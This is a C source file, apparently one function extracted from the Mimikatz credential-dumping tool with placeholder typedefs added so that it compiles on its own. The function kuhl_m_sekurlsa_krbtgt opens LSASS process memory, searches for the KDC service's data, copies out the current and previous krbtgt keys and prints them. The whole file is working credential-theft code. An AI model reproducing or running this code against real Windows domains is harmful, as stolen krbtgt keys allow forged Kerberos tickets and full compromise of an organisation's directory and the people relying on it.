
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_13__ TYPE_7__ ;
typedef struct TYPE_12__ TYPE_6__ ;
typedef struct TYPE_11__ TYPE_5__ ;
typedef struct TYPE_10__ TYPE_2__ ;
typedef struct TYPE_9__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_12__ {scalar_t__ isPresent; } ;
struct TYPE_13__ {TYPE_6__ Module; } ;
struct TYPE_11__ {int * hLsassMem; } ;
struct TYPE_10__ {int krbtgt_previous; int krbtgt_current; int * member_1; int * member_0; } ;
struct TYPE_9__ {scalar_t__ address; int * member_1; TYPE_2__* member_0; } ;
typedef int PVOID ;
typedef scalar_t__ PBYTE ;
typedef int NTSTATUS ;
typedef int LONG ;
typedef TYPE_1__ KULL_M_MEMORY_ADDRESS ;
typedef TYPE_2__ DUAL_KRBTGT ;


 int ARRAYSIZE (int ) ;
 int KULL_M_MEMORY_GLOBAL_OWN_HANDLE ;
 scalar_t__ NT_SUCCESS (int ) ;
 int PRINT_ERROR (char*) ;
 int SecDataReferences ;
 TYPE_5__ cLsass ;
 int kuhl_m_sekurlsa_acquireLSA () ;
 TYPE_7__ kuhl_m_sekurlsa_kdcsvc_package ;
 int kuhl_m_sekurlsa_krbtgt_keys (int ,char*) ;
 scalar_t__ kuhl_m_sekurlsa_utils_search_generic (TYPE_5__*,TYPE_6__*,int ,int ,scalar_t__*,int *,int *,int*) ;
 scalar_t__ kull_m_memory_copy (TYPE_1__*,TYPE_1__*,int) ;

NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
{
 NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
 LONG l = 0;
 DUAL_KRBTGT dualKrbtgt = {((void*)0), ((void*)0)};
 KULL_M_MEMORY_ADDRESS aLsass = {((void*)0), cLsass.hLsassMem}, aLocal = {&dualKrbtgt, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

 if(NT_SUCCESS(status))
 {
  if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
  {
   if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, ((void*)0), ((void*)0), &l))
   {
    aLsass.address = (PBYTE) aLsass.address + sizeof(PVOID) * l;
    if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(DUAL_KRBTGT)))
    {
     kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, L"Current");
     kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, L"Previous");
    }
   }
   else PRINT_ERROR(L"Unable to find KDC pattern in LSASS memory\n");
  }
  else PRINT_ERROR(L"KDC service not in LSASS memory\n");
 }
 return status;
}
